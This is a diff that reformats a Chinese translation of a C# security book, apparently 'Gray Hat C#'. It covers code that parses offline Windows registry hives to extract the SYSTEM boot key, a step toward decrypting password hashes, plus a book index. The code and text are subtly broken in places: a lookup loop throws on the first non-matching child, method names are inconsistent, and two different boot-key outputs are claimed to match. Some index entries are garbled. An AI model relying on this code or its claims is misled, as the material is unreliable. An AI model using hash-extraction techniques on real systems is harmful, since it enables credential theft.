 需要注意的是，`databuf` 变量 ⑤ 既可以包含指向值键的指针，也可以包含值键本身——如果长度为五个或更多，数据通常位于一个四字节指针中。我们使用 `Data` 属性 ⑥ 来检查 `ValueKey` 长度是否小于五。如果是，我们将数据直接赋值给 `Data` 属性 ⑦ 并完成操作。否则，我们将变量转换为一个 32 位整数 ⑧，该整数是相对于流文件中当前位置到要读取的实际数据的偏移量，然后跳转到流中的该位置并使用 `ReadBytes()` 读取数据，将其赋值给 `Data` 属性。
 
@@ -7966,11 +8063,11 @@ public static void Main(string[] args)
 }
 ```
 
-列表 14-11：用于打印注册表配置单元根键名称的 Main() 方法
+列表 14-11：用于打印注册表配置单元根键名称的 `Main()` 方法
 
 在 `Main()` 方法中，我们通过将程序的第一个参数作为文件系统上离线注册表配置单元的文件路径，来实例化新的 `RegistryHive`。然后，我们打印注册表根节点的名称，该名称存储在 `RegistryHive` 类的 `RootKey` 属性中：
 
-```
+```bash
 $ /ch14_reading_offline_hives.exe /Users/berry/system.hive
 RootKey's name is CMI-{2A7FB999-7BBE-4B5D-B91E-E7CB51D4372F}
 ```
@@ -7979,9 +8076,9 @@ RootKey's name is CMI-{2A7FB999-7BBE-4B5D-B91E-E7CB51D4372F}
 
 ## 导出启动键（Boot Key）
 
-用户名虽然不错，但密码哈希值（password hashes）可能有用得多。因此，我们将查看如何找到它们。为了访问密码哈希值，我们需要首先从 SYSTEM 配置单元检索启动键。注册表中的密码哈希值是用启动键加密的，通过 `Main()` 方法可以导出这些配置单元的键。
+用户名虽然不错，但密码哈希值（password hashes）可能有用得多。因此，我们将查看如何找到它们。为了访问密码哈希值，我们需要首先从 `SYSTEM` 配置单元检索启动键。注册表中的密码哈希值是用启动键加密的，通过 `Main()` 方法可以导出这些配置单元的键。
 
-## GetKey() 方法
+## `GetKey()` 方法
 
 `GetKey()` 方法是第一个方法，它接收配置单元。注册表中的密码哈希值跨越多个配置单元，我们需要通过 `KeyValue()` 获取启动键。该方法的开头在列表 14-12 所示：
 
@@ -8000,12 +8097,13 @@ static byte[] GetKey(RegistryHive hive)
             scrambledKey.append(nk[i]);
         }
     }
+```
 
-列表 14-12：GetKey() 方法的开头
+列表 14-12：`GetKey()` 方法的开头
 
 在将混后的键转换为字节数组后（我们稍后实现 `ToByteArray()`），我们创建另一个字节数组。我们需要遍历配置单元的默认值，以获取最终的启动键。
 
-## GetValue() 方法
+## `GetValue()` 方法
 
 `KeyValue()` 方法在列表 14-14 中所示，它返回给定路径的值：
 
@@ -8018,11 +8116,11 @@ static ValueKey GetKeyValue(Registry hive, string path)
 }
 ```
 
-列表 14-14：KeyValue() 方法
+列表 14-14：`KeyValue()` 方法
 
-这个简单的方法接受一个注册表配置单元 ❶ 和要在配置单元中查找的路径 ➁。使用反斜杠字符分隔节点，我们将分割 ⓷路径并取最后的部分 ④ 作为要查找的值。然后我们将注册表配置单元和传递传递 `GetNodeKey()` ⑤（稍后实现），它将返回包含键的节点。最后，我们使用 LINQ 方法 `SingleOrDefault()` �� 返回节点值中的值键。
+这个简单的方法接受一个注册表配置单元 ❶ 和要在配置单元中查找的路径 ➁。使用反斜杠字符分隔节点，我们将分割 ⓷ 路径并取最后的部分 ④ 作为要查找的值。然后我们将注册表配置单元传递给 `GetNodeKey()` ⑤（稍后实现），它将返回包含键的节点。最后，我们使用 LINQ 方法 `SingleOrDefault()` 返回节点值中的值键。
 
-## GetNodeKey() 方法
+## `GetNodeKey()` 方法
 
 `GetNodeKey()` 方法比 `KeyValue()` 方法更复杂。列表 14-15 所示，`GetNodeKey()` 方法遍历配置单元直到找到给定的节点键并返回该节点键。
 
@@ -8030,10 +8128,12 @@ static ValueKey GetKeyValue(Registry hive, string path)
 {
   NodeKey node = null;
   string[] paths = path.Split('\\');
+
   foreach (string ch in paths)
   {
     if (node == null)
       node = hive.Root;
+
     foreach (NodeKey child in node.ChildNodes)
     {
       if (child.Name == ch)
@@ -8041,25 +8141,24 @@ static ValueKey GetKeyValue(Registry hive, string path)
         node = child;
         break;
       }
+
       throw new Exception("No node found with: " + ch);
     }
   }
+
   return node;
 }
 ```
 
-列表 14-15：GetNodeKey() 方法接受两个参数——注册表配置单元 ❶
-
-
-
+列表 14-15：`GetNodeKey()` 方法接受两个参数——注册表配置单元 ❶
 
 遍历 `paths` 数组中的每个路径段 ⑤。当我们遍历每个段时，在 `for` 循环内部使用一个 `foreach` 循环 ⑨ 来寻找路径中的下一个段，直到找到最后一个节点。最后，我们返回 ⑦ 找到的节点。
 
-# StringToByteArray() 方法
+## `StringToByteArray()` 方法
 
 最后，我们实现了在列表 14-13 中使用的 `StringToByteArray` 方法。这个非常简单的方法在列表 14-16 中进行了详细介绍。
 
-```c
+```csharp
 static byte[] StringToByteArray(string s)
 {
     return Enumerable.Range(0, s.Length)
@@ -8069,10 +8168,11 @@ static byte[] StringToByteArray(string s)
 }
 ```
 
-> 列表 14-13：GetBootKey 使用的 StringToByteArray() 方法
-`StringToByteArray` 方法使用 LINQ 将每个两个字符的字符串转换为单个字节。例如，如果传入 "FAAF"，该方法将返回一个包含 (0xFA, 0xAF) 的字节数组。使用 `Enumerable.Range` ① 遍历字符串中的每个字符，通过 `Where` ➁ 跳过奇数位置的字符，然后使用 `Select` ③ 将每对字符转换为其表示的字节对。
+> 列表 14-13：`GetBootKey` 使用的 `StringToByteArray()` 方法
 
-# 获取启动密钥
+`StringToByteArray` 方法使用 LINQ 将每个两个字符的字符串转换为单个字节。例如，如果传入 `"FAAF"`，该方法将返回一个包含 `(0xFA, 0xAF)` 的字节数组。使用 `Enumerable.Range` ① 遍历字符串中的每个字符，通过 `Where` ➁ 跳过奇数位置的字符，然后使用 `Select` ③ 将每对字符转换为其表示的字节对。
+
+## 获取启动密钥
 
 我们终于可以从系统配置单元（hive）中导出启动密钥了。通过调用我们新写的 `GetBootKey()` 方法，我们可以重写之前使用的 `Main()` 方法，改为打印根键名称。列表 14-17 显示了这一点。
 
@@ -8085,38 +8185,50 @@ public static void Main(string[] args)
 }
 ```
 
-> 列表 14-17：测试配置表的 Main() 方法
+> 列表 14-17：测试配置表的 `Main()` 方法
+
 此 `Main()` 方法将打开配置单元 ①，该单元作为唯一参数传递给程序。然后将配置单元传递给 `GetBootKey()` 方法 ②。在保存了新的启动密钥后，我们使用 `Console.WriteLine()` 打印启动密钥。
 
 然后，我们可以运行代码来打印启动密钥，如列表 14-18 所示。
+
+```text
 $ /ch14_reading_offline.hives ~/system.hive
 
 Boot key: F8-C7-0D-21-3E-9D-98-01-45-63-01-E4-F1-B4-1E
 $
+```
 
-> 列表 14-18：运行最后的 Main() 方法
+> 列表 14-18：运行最后的 `Main()` 方法
 
 成功了！但我们如何确定这就是真正的启动密钥呢？
 
-# 验证启动密钥
+## 验证启动密钥
 
-我们可以通过将代码结果与 `bhkhive` 的结果进行对比来验证我们的代码运行正常。`bhkhive` 是一个用于导出系统配置单元启动密钥的热门工具，正如我们做的那样。本书的代码仓库（通过书籍页面 https://www.nostarch.com/grayhatsharp/ 链接）中包含了 `bhkhive` 工具的源代码。在本地编译并运行该工具可以验证我们的结果，如列表 14-19 所示。
+我们可以通过将代码结果与 `bhkhive` 的结果进行对比来验证我们的代码运行正常。`bhkhive` 是一个用于导出系统配置单元启动密钥的热门工具，正如我们做的那样。本书的代码仓库（通过书籍页面 <https://www.nostarch.com/grayhatsharp/> 链接）中包含了 `bhkhive` 工具的源代码。在本地编译并运行该工具可以验证我们的结果，如列表 14-19 所示。
 
 ```bash
 $ cd bhkhive-1.1.1
 $ make
 $ ./bhkhive ~/system.hive /dev/null
+
 bhkhive 1.1.1 by object Secure
+
 http://www.objectif-secure.it
+
 original author: ncuomo@studentunina.it
+
 Root Key: CMI-CreateKey{2A7FB991-B2BE-4F9D-B91E-7CB5D14373F5}
+
 DefaultControlSet:001
+
 Bootkey: 8c70d21de9de8901456301e4f4b1ae4
 ```
 
-> 列表 14-19：验证我们代码返回的启动密钥，bhkhive 输出非常完美！
 
-`bhkhive` 工具证明了我们的启动密钥导出器工作方式与我们不同（全小写并带连字符），但它打印的数据与我们的相同（F8C70D21...）。
+
+> 列表 14-19：验证我们代码返回的启动密钥，`bhkhive` 输出非常完美！
+
+`bhkhive` 工具证明了我们的启动密钥导出器工作方式与我们不同（全小写并带连字符），但它打印的数据与我们的相同（`F8C70D21...`）。
 
 你可能会想，为什么我们要费劲用 C 类来导出启动密钥。`bhkhive` 工具是非常专业化的，只会读取配置单元的特定部分，但我们实现的类可以读取配置单元的任何部分，例如密码哈希值（它们是用启动密钥加密的！）和补丁级别信息。我们的类比 `bhkhive` 工具要灵活得多，如果你想扩展应用程序，可以将它们作为起点。
 
@@ -8129,748 +8241,750 @@ Bootkey: 8c70d21de9de8901456301e4f4b1ae4
 # INDEX
 
 ## A
--   抽象类
--   抽象类，160–161
--   定义，4
--   抽象语法树 (AST)，243
--   匿名方法
--   分配给方法
--   可选，10–11
--   Firefighter 类，9
--   Main() 方法，11–12
--   (接口)，224
--   Cuckoo 沙箱，148
--   Nessus，103
--   Nexpose 类，124
--   Session 类，118
--   RPC，208–209
--   sqlmap，223
--   nirc 脚本，229
--   rpc 脚本，229
--   安装，223
--   Main() 方法，237
--   API，224–228
--   Manager 类，226–228
--   Session 类，225–226
--   RPC，236–237
--   Manager 类，230–234
--   Session 类，234–235
--   方法，230–34
+
+- 抽象类
+- 抽象类，160–161
+- 定义，4
+- 抽象语法树（AST），243
+- 匿名方法
+- 分配给方法
+- 可选，10–11
+- `Firefighter` 类，9
+- `Main()` 方法，11–12
+- 接口，224
+- `Cuckoo` 沙箱，148
+- `Nessus`，103
+- `Nexpose` 类，124
+- `Session` 类，118
+- `RPC`，208–209
+- `sqlmap`，223
+- `nirc` 脚本，229
+- `rpc` 脚本，229
+- 安装，223
+- `Main()` 方法，237
+- API，224–228
+- `Manager` 类，226–228
+- `Session` 类，225–226
+- `RPC`，236–237
+- `Manager` 类，230–234
+- `Session` 类，234–235
+- 方法，230–34
 
 ## B
--   启动虚拟机
--   启动密钥导出
--   布尔值
--   参数，29–31
--   写入请求，25–27
--   输出，182–184
--   绑定负载，85–86
--   接收数据，86
--   执行流，87–88
--   输出，87
--   运行命令，87
--   位码，194
--   bhkhive 工具，263
--   布尔盲注，43–44
--   启动密钥
--   GetBootKey() 方法，259–261
--   GetNode() 方法，261–262
--   GetValue() 方法，261
--   StringToByteArray() 方法，262
--   验证启动密钥，263–264
--   布尔
+
+- 启动虚拟机
+- 启动密钥导出
+- 布尔值
+- 参数，29–31
+- 写入请求，25–27
+- 输出，182–184
+- 绑定负载，85–86
+- 接收数据，86
+- 执行流，87–88
+- 输出，87
+- 运行命令，87
+- 位码，194
+- `bhkhive` 工具，263
+- 布尔盲注，43–44
+- 启动密钥
+- `GetBootKey()` 方法，259–261
+- `GetNode()` 方法，261–262
+- `GetValue()` 方法，261
+- `StringToByteArray()` 方法，262
+- 验证启动密钥，263–264
+- 布尔
 
 ## C
--   C# 语言方法，9–12
--   匿名方法
--   可选参数，9–10
--   Main 方法，11–12
--   类，4–7
--   接口，4–7
--   Main() 方法，7–9
--   原生库，2–3
--   类型和注册表项，250–257
--   SOAP，58–67
--   CIL（通用中间语言）字节码，245
--   cl_scanfile 函数（ClamEngine 类），198–200
--   ClamAV，191
--   clam 进程，201–205
--   ClamManager 类，204–205
--   ClamSession 类，203–204
--   安装，202
--   启动，202–203
--   测试，205–206
--   安装，192–193
--   原生库，193–201
--   访问函数，196–198
--   ClamEngine 类，类，195
--   Dispose() 方法，198–200
--   枚举，194–195
--   扫描文件，198–200
--   测试，200–201
--   ClamBindings 类，196
--   ClamDatabaseOptions 枚举，194
 
+- C# 语言方法，9–12
+- 匿名方法
+- 可选参数，9–10
+- `Main` 方法，11–12
+- 类，4–7
+- 接口，4–7
+- `Main()` 方法，7–9
+- 原生库，2–3
+- 类型和注册表项，250–257
+- SOAP，58–67
+- CIL（通用中间语言）字节码，245
+- `cl_scanfile` 函数（`ClamEngine` 类），198–200
+- `ClamAV`，191
+- `clam` 进程，201–205
+- `ClamManager` 类，204–205
+- `ClamSession` 类，203–204
+- 安装，202
+- 启动，202–203
+- 测试，205–206
+- 安装，192–193
+- 原生库，193–201
+- 访问函数，196–198
+- `ClamEngine` 类，类，195
+- `Dispose()` 方法，198–200
+- 枚举，194–195
+- 扫描文件，198–200
+- 测试，200–201
+- `ClamBindings` 类，196
+- `ClamDatabaseOptions` 枚举，194
 
-
-
-endpoints (端点) Cuckoo Sandbox, 147
-创建文件分析任务, 163–164
-CuckooManager 类, 157–162
-抽象 Task 类, 160–161
-- ICreate() 方法, 157–158
-- 报告方法, 159–160
-- 排序和创建不同的类类型， 161–162
-- 任务详情， 159
-CuckooSession 类, 151–157
-- 使用 GetMultipartFormData() 方法创建多部分 HTTP 数据, 153–155
-- FileParameter 类, 155
-- 测试, 156–157
-- 写入 ExecuteCommand() 方法以处理 HTTP 请求, 151–153
-年度运行 API, 148–150
-- 设置, 148
-测试应用程序, 164–165
-curl 命令行工具
-测试 Arachni REST API, 225
-测试 Cuckoo 状态, 149–150
-测试 Nexpose API, 118
-测试 sqlmap API, 170–173
+- `endpoints`（端点）Cuckoo Sandbox，147
+- 创建文件分析任务，163–164
+- `CuckooManager` 类，157–162
+- 抽象 `Task` 类，160–161
+  - `ICreate()` 方法，157–158
+  - 报告方法，159–160
+  - 排序和创建不同的类类型，161–162
+  - 任务详情，159
+- `CuckooSession` 类，151–157
+  - 使用 `GetMultipartFormData()` 方法创建多部分 HTTP 数据，153–155
+  - `FileParameter` 类，155
+  - 测试，156–157
+  - 编写 `ExecuteCommand()` 方法以处理 HTTP 请求，151–153
+- 年度运行 API，148–150
+  - 设置，148
+- 测试应用程序，164–165
+- `curl` 命令行工具
+  - 测试 Arachni REST API，225
+  - 测试 Cuckoo 状态，149–150
+  - 测试 Nexpose API，118
+  - 测试 `sqlmap` API，170–173
 
 # D
 
-DateTime 类, 3
-反编译器器, 242–245
-- DecompressData() 方法 (ArachniRPCSession 类), 233
-委托，分配给方法, 9
-- DeleteFile() 方法 (NexposeManager 类), 128
-- DeleteTask() 方法 (SqlmapManager 类), 178–179
-反序列化, 175
-分发 (RPC 框架), 230
-Dispose() 方法
-ArachniRPCSession 类, 234
-ClamAV 原生库, 198–200
-ClamEngine 类, 200
-CuckooManager 类, 160
-
-MetasploitSession 类, 216
-NessusSession 类, 107–108
-NexposeSession 类, 123
-SqlmapManager 类, 178
-SqlmapSession 类, 174
-转储启动密钥
-- GetBootKey() 方法, 259–261, 262–263
-- GetNode() 方法, 261–262
-- GetValueArray() 方法, 261
-- StringToByteArray() 方法, 262
-验证启动密钥, 263–264
+- `DateTime` 类，3
+- 反编译器，242–245
+  - `DecompressData()` 方法（`ArachniRPCSession` 类），233
+- 委托，分配给方法，9
+  - `DeleteFile()` 方法（`NexposeManager` 类），128
+  - `DeleteTask()` 方法（`SqlmapManager` 类），178–179
+- 反序列化，175
+- 分发（RPC 框架），230
+- `Dispose()` 方法
+  - `ArachniRPCSession` 类，234
+  - `ClamAV` 原生库，198–200
+  - `ClamEngine` 类，200
+  - `CuckooManager` 类，160
+  - `MetasploitSession` 类，216
+  - `NessusSession` 类，107–108
+  - `NexposeSession` 类，123
+  - `SqlmapManager` 类，178
+  - `SqlmapSession` 类，174
+- 转储启动密钥
+  - `GetBootKey()` 方法，259–261，262–263
+  - `GetNode()` 方法，261–262
+  - `GetValueArray()` 方法，261
+  - `StringToByteArray()` 方法，262
+- 验证启动密钥，263–264
 
 # E
 
-EICAR 文件, 200–201
-endpoints (端点)
-SOAP. 见 SOAP 端点
-sqlmap API, 167
-枚举 (ClamAV), 194–195
-ExecuteCommand() 方法
-- ArachniRPCSession 类, 234–235
-- CuckooSession 类, 151–153
-- NexposeSession 类, 120–123
-- OpenVASession 类, 136–137
-- ExecuteGet() 方法 (SqlmapSession 类), 174–195
-Execute() 方法
-- ClamdSession 类, 203–204
-- MetasploitSession 类, 213–215
-- MSGPACK 库, 210
-- ExecuteModule() 方法 (MetasploitManager 类), 219
-- ExecutePost() 方法 (SqlmapSession 类), 175
-- ExecuteRequest() 方法 (ArachniHTTPSession 类), 226
-利用 SQL 注入
-- 布尔盲注 SQL 注入, 43–51
-- 基于 UNION 的注入, 38–43
+- `EICAR` 文件，200–201
+- `endpoints`（端点）
+  - SOAP。见 SOAP 端点
+  - `sqlmap` API，167
+- 枚举（ClamAV），194–195
+- `ExecuteCommand()` 方法
+  - `ArachniRPCSession` 类，234–235
+  - `CuckooSession` 类，151–153
+  - `NexposeSession` 类，120–123
+  - `OpenVASession` 类，136–137
+  - `ExecuteGet()` 方法（`SqlmapSession` 类），174–195
+- `Execute()` 方法
+  - `ClamdSession` 类，203–204
+  - `MetasploitSession` 类，213–215
+  - `MSGPACK` 库，210
+  - `ExecuteModule()` 方法（`MetasploitManager` 类），219
+  - `ExecutePost()` 方法（`SqlmapSession` 类），175
+  - `ExecuteRequest()` 方法（`ArachniHTTPSession` 类），226
+- 利用 SQL 注入
+  - 布尔盲注 SQL 注入，43–51
+  - 基于 UNION 的注入，38–43
 
 # F
 
-FileParameter 类 (CuckooSession 类), 155
-
-FileTask 类 (Cuckoo Sandbox), 161–162
-
-- First() 方法 (反弹有效负载), 84
-for 循环
-- 子节点和, 256–257
-方法和, 50–51
-获取数据库计数（用户数据库计数）的长度, 45–46
-在其中发送负载, 47
-函数
-- ClamAV 原生库, 196–200
-声明, 13
-从 libc 导入, 98–99
-SQL, 39–40, 46
-模糊器 (fuzzers), 另见跨站脚本模糊, 20–22
-SOAP, 185–190
-
-FuzzHttpGetPort() 方法
-模糊 SOAP 服务, 70–72
-sqlmap 工具 (模糊 SOAP 服务), 189
-
-FuzzHttpPostPort() 方法
-模糊 SOAP 服务, 72–75
-sqlmap 工具, 189–190
-模糊测试 (fuzzing)
-定义, 16
-使用变异模糊器的 GET 请求, 22–25
-JSON, 31–38
-捕获漏洞的 JSON 请求, 31–33
-HTTP 请求, 33–34, 35–37
-遍历键值对, 34–35
-设置有漏洞设备, 31
-测试, 37–38
-POST 请求, 25–31
-参数, 29–31
-写入请求, 27–29
-用于 SQL 注入漏洞的 SOAP 端点, 68–79
-HTTP POST SOAP 端口, 72–75
-单个 SOAP 服务, 69–72
-运行模糊器, 78–79
-SOAP 端口, 75–78
-SQL 注入, 19–20, 38–51
-虚拟机, 16–18
-添加仅限主机网络, 16
-从 BadStore 启动, 17–18
-创建, 17
-FuzzService() 方法 (SOAP 服务), 69
-FuzzPort() 方法
-模糊 SOAP 服务, 75–78
-sqlmap 工具, 188–189
+- `FileParameter` 类（`CuckooSession` 类），155
+- `FileTask` 类（Cuckoo Sandbox），161–162
+- `First()` 方法（反弹有效负载），84
+- `for` 循环
+  - 子节点和，256–257
+- 方法和，50–51
+- 获取数据库计数（用户数据库计数）的长度，45–46
+- 在其中发送负载，47
+- 函数
+  - `ClamAV` 原生库，196–200
+  - 声明，13
+  - 从 `libc` 导入，98–99
+  - SQL，39–40，46
+- 模糊器（fuzzers），另见跨站脚本模糊，20–22
+- SOAP，185–190
+- `FuzzHttpGetPort()` 方法
+  - 模糊 SOAP 服务，70–72
+  - `sqlmap` 工具（模糊 SOAP 服务），189
+- `FuzzHttpPostPort()` 方法
+  - 模糊 SOAP 服务，72–75
+  - `sqlmap` 工具，189–190
+- 模糊测试（fuzzing）
+  - 定义，16
+  - 使用变异模糊器的 GET 请求，22–25
+  - JSON，31–38
+  - 捕获漏洞的 JSON 请求，31–33
+  - HTTP 请求，33–34，35–37
+  - 遍历键值对，34–35
+  - 设置有漏洞设备，31
+  - 测试，37–38
+  - POST 请求，25–31
+  - 参数，29–31
+  - 写入请求，27–29
+  - 用于 SQL 注入漏洞的 SOAP 端点，68–79
+  - HTTP POST SOAP 端口，72–75
+  - 单个 SOAP 服务，69–72
+  - 运行模糊器，78–79
+  - SOAP 端口，75–78
+  - SQL 注入，19–20，38–51
+  - 虚拟机，16–18
+  - 添加仅限主机网络，16
+  - 从 BadStore 启动，17–18
+  - 创建，17
+- `FuzzService()` 方法（SOAP 服务），69
+- `FuzzPort()` 方法
+  - 模糊 SOAP 服务，75–78
+  - `sqlmap` 工具，188–189
 
 # G
 
-get_version 命令 (OpenVASession 类), 139
-- GetBootKey() 方法, 259–261, 262–263
-- GetLength() 方法 (绑定注入), 47–49
-- GetLog() 方法 (SqlmapLog 类), 183–184
-- GetMultiPart() 方法 (CuckooSession 类), 153–155
-- GetGetKey() 方法, 261–262
-- GetObject() 方法 (Metasploit 类), 216
-- GetOptions() 方法 (SqlmapManager 类), 179
-- GetPdfReport() 方法 (NexposeManager 类), 128
-- GetProgress() 方法 (ArachniRPC 类), 237
-GET 请求
-向 SOAP 模糊器添加 sqlmap 请求, 185–187
-使用变异模糊器模糊, 22–25
-sqlmap REST API, 169–170
-使用 WebRequest 执行, 174–175
-GetScanConfigurations() 方法 (OpenVASManager 类), 141–142
-GetScanStatus() 方法
-ArachniHTTPManager 类, 227–228
-NexposeManager 类, 127
-sqlmapStatus 类, 181–182
-GetStream() 方法
-ArachniRPCSession 类, 233
-OpenVASession 类, 138
-- GetTaskDetails() 方法 (CuckooManager 类), 159, 163
-- GetTaskReport() 方法 (CuckooManager 类), 159, 163
-- GetTaskResults() 方法 (OpenVASManager 类), 143–144
-- GetTasks() 方法 (OpenVASManager 类), 143–144
-- GetKeyValue() 方法, 261
-- GetValue() 方法 (盲注), 49–50
-- GetVersion() 方法 (ClamManager 类), 205
-全局唯一 ID (Guid), 110
+- `get_version` 命令（`OpenVASession` 类），139
+- `GetBootKey()` 方法，259–261，262–263
+- `GetLength()` 方法（绑定注入），47–49
+- `GetLog()` 方法（`SqlmapLog` 类），183–184
+- `GetMultiPart()` 方法（`CuckooSession` 类），153–155
+- `GetGetKey()` 方法，261–262
+- `GetObject()` 方法（`Metasploit` 类），216
+- `GetOptions()` 方法（`SqlmapManager` 类），179
+- `GetPdfReport()` 方法（`NexposeManager` 类），128
+- `GetProgress()` 方法（`ArachniRPC` 类），237
+- GET 请求
+  - 向 SOAP 模糊器添加 `sqlmap` 请求，185–187
+  - 使用变异模糊器模糊，22–25
+  - `sqlmap` REST API，169–170
+  - 使用 `WebRequest` 执行，174–175
+- `GetScanConfigurations()` 方法（`OpenVASManager` 类），141–142
+- `GetScanStatus()` 方法
+  - `ArachniHTTPManager` 类，227–228
+  - `NexposeManager` 类，127
+  - `sqlmapStatus` 类，181–182
+- `GetStream()` 方法
+  - `ArachniRPCSession` 类，233
+  - `OpenVASession` 类，138
+- `GetTaskDetails()` 方法（`CuckooManager` 类），159，163
+- `GetTaskReport()` 方法（`CuckooManager` 类），159，163
+- `GetTaskResults()` 方法（`OpenVASManager` 类），143–144
+- `GetTasks()` 方法（`OpenVASManager` 类），143–144
+- `GetKeyValue()` 方法，261
+- `GetValue()` 方法（盲注），49–50
+- `GetVersion()` 方法（`ClamManager` 类），205
+- 全局唯一 ID（`Guid`），110
 
 # H
 
-Hello World 示例, 2–3
-仅限主机网络，添加到 VM, 16
-HTTP 请求
-构建, 23–24
-DELETE, 167
-GET 请求
-向 SOAP 模糊器添加 sqlmap 请求, 185–187
-使用变异模糊器模糊, 22–25
-执行 sqlmap REST 方法, 174–170
-JSON
-捕获漏洞的 JSON, 31–33
-Fuzz() 方法, 35–37
-读取, 33–34
-NessusSession 类, 106–107
-NexposeSession 类, 120–121
-POST
-模糊测试, 25–31, 72–75
-集成 sqlmap 工具, 187–188
-参数, 28
-sqlmap API, 167, 170–172
-PUT, 167
-REST APIs 和, 104
-写入处理 ExecuteCommand() 方法, 151–153
-HTTP 响应 (NexposeSession 类), 121–123
-HttpRequest 类, 24, 36, 42
+- Hello World 示例，2–3
+- 仅限主机网络，添加到 VM，16
+- HTTP 请求
+  - 构建，23–24
+  - DELETE，167
+  - GET 请求
+    - 向 SOAP 模糊器添加 `sqlmap` 请求，185–187
+    - 使用变异模糊器模糊，22–25
+    - 执行 `sqlmap` REST 方法，174–170
+  - JSON
+    - 捕获漏洞的 JSON，31–33
+    - `Fuzz()` 方法，35–37
+    - 读取，33–34
+  - `NessusSession` 类，106–107
+  - `NexposeSession` 类，120–121
+  - POST
+    - 模糊测试，25–31，72–75
+    - 集成 `sqlmap` 工具，187–188
+    - 参数，28
+    - `sqlmap` API，167，170–172
+  - PUT，167
+  - REST APIs 和，104
+  - 编写处理 `ExecuteCommand()` 方法，151–153
+- HTTP 响应（`NexposeSession` 类），121–123
+- `HttpRequest` 类，24，36，42
 
 # I
 
-IDEs (集成开发环境), 1–2, 210
-IL (中间语言), 246
-ILSpy 反编译器, 242
-实例
-定义, 4
-RPC 框架, 230
-实例化对象, 24
-集成开发环境 (IDEs), 1–2, 210
-接口，定义, 4–7
-中间语言 (IL), 246
-int.Parse() 方法, 83, 176
-IsBusy() 方法 (ArachniRPCManager 类), 237
+- IDEs（集成开发环境），1–2，210
+- IL（中间语言），246
+- `ILSpy` 反编译器，242
+- 实例
+  - 定义，4
+  - RPC 框架，230
+- 实例化对象，24
+- 集成开发环境（IDEs），1–2，210
+- 接口，定义，4–7
+- 中间语言（IL），246
+- `int.Parse()` 方法，83，176
+- `IsBusy()` 方法（`ArachniRPCManager` 类），237
 
 # J
 
-JavaScript Object Notation. 见 JSON Join() (反弹有效负载), 84
-JSON (JavaScript Object Notation). 另见 sqlmap 工具
-捕获漏洞的 JSON 请求, 31–33
-HTTP 请求, 33–34, 35–37
-遍历键值对, 34–35
-设置有漏洞设备, 31
-测试, 37–38
-Json.NET 库, 34, 51
-JsonConvert 类, 181
-SqlmapManager 类, 177–179
-SqlmapSession 类, 176–177
+- JavaScript Object Notation。见 JSON
+- `Join()`（反弹有效负载），84
+- JSON（JavaScript Object Notation）。另见 `sqlmap` 工具
+  - 捕获漏洞的 JSON 请求，31–33
+  - HTTP 请求，33–34，35–37
+  - 遍历键值对，34–35
+  - 设置有漏洞设备，31
+  - 测试，37–38
+- `Json.NET` 库，34，51
+- `JsonConvert` 类，181
+- `SqlmapManager` 类，177–179
+- `SqlmapSession` 类，176–177
 
 # K
 
-kernel32.dll 库, 96–98
+- `kernel32.dll` 库，96–98
 
 # L
 
-Language-Integrated Query. 见 LINQ Level 属性 (SqlmapLogItem 类), 182–183
-库
-ClamAV, 193–201
-访问函数, 196–197
-ClamEngine 类, 197–198
-类, 195
-Dispose() 方法, 198–200
-枚举, 194–195
-扫描文件, 198–200
-ClamAV 原生库, 196–200
-执行原生 Linux 负载, 98–102
-生成 Metasploit 负载, 96
-安装 ClamAV, 192
-print() 函数, 13
-LogOut() 方法
-Linux
-BadStore, 16, 17–18
-从 BadStore 启动, 17–18
-创建, 17
-Descendants() 类, 145
-LINQ (集成语言查询)
-LINQ to XML 和, 76
-对象关系映射, 20, 242–244
-payloads (负载)
-执行原生 Linux 负载, 98–102
-生成, 96
-设置, 94–96
-非托管代码, 96–209
-RPC API, 208–209
-运行漏洞, 220–221
-Metasploitable 2, 209
-MetasploitManager 类, 217–219
-MetasploitSession 类, 212–213
-Execute() 方法, 213–215
-测试, 217
-转换响应数据, 215–217
-
-
-
-
-已定义, 4
-MIDO() SQL 函数, 46
-MonoDevelop
-安装, 2
-安装 MSGPACK 库, 210–212
-monodis 程序, 245–247
-Mono 框架。见托管程序 (managed assemblies)
-msfvenom (Metasploit), 96, 103
-MSGPACK 库, 209–210
-暂停, 211
-NuGet 包管理器, 210
-引用的, 211–212
-变异模糊器
-已定义, 15
-使用 GET 请求进行模糊, 22–25
+- Language-Integrated Query。见 LINQ
+- `Level` 属性（`SqlmapLogItem` 类），182–183
+- 库
+  - `ClamAV`，193–201
+  - 访问函数，196–197
+  - `ClamEngine` 类，197–198
+  - 类，195
+  - `Dispose()` 方法，198–200
+  - 枚举，194–195
+  - 扫描文件，198–200
+  - `ClamAV` 原生库，196–200
+  - 执行原生 Linux 负载，98–102
+  - 生成 Metasploit 负载，96
+  - 安装 `ClamAV`，192
+- `print()` 函数，13
+- `LogOut()` 方法
+- Linux
+  - BadStore，16，17–18
+  - 从 BadStore 启动，17–18
+  - 创建，17
+  - `Descendants()` 类，145
+- LINQ（集成语言查询）
+  - LINQ to XML 和，76
+  - 对象关系映射，20，242–244
+- `payloads`（负载）
+  - 执行原生 Linux 负载，98–102
+  - 生成，96
+  - 设置，94–96
+  - 非托管代码，96–209
+  - RPC API，208–209
+  - 运行漏洞，220–221
+- `Metasploitable 2`，209
+- `MetasploitManager` 类，217–219
+- `MetasploitSession` 类，212–213
+- `Execute()` 方法，213–215
+- 测试，217
+- 转换响应数据，215–217
+- 已定义，4
+- `MIDO()` SQL 函数，46
+- MonoDevelop
+  - 安装，2
+  - 安装 `MSGPACK` 库，210–212
+- `monodis` 程序，245–247
+- Mono 框架。见托管程序（managed assemblies）
+- `msfvenom`（Metasploit），96，103
+- `MSGPACK` 库，209–210
+  - 暂停，211
+  - `NuGet` 包管理器，210
+  - 引用的，211–212
+- 变异模糊器
+  - 已定义，15
+  - 使用 GET 请求进行模糊，22–25
 
 # N
 
-Name 属性 (SoapMessage 类), 59, 61
-命名空间
-已定义, 3
-SOAP XML, 76
-System.Linq 命名空间, 84
-XML, 56–57
-相关库, 12–13。另见 x86 汇编库, 241。另见托管程序 (managed assemblies) 
-Nessus, 103–104
-NessusManager 类, 109–110
-NessusSession 类, 105–109
-HTTP 请求, 106–107
-登录, 107–108
-测试, 108–109
-执行扫描, 110–113
-REST 架构和, 104–105
-.NET 库。见托管程序 (managed assemblies)
-网络流绑定载荷, 85–88
-反弹载荷 (payloads), 82–84
-NewTask() 方法 (SqlmapManager 类), 178–179
-暴露, 115
-自动化漏洞扫描, 126–127, 130
-安装, 116–118
-NexposeManager 类, 124–125
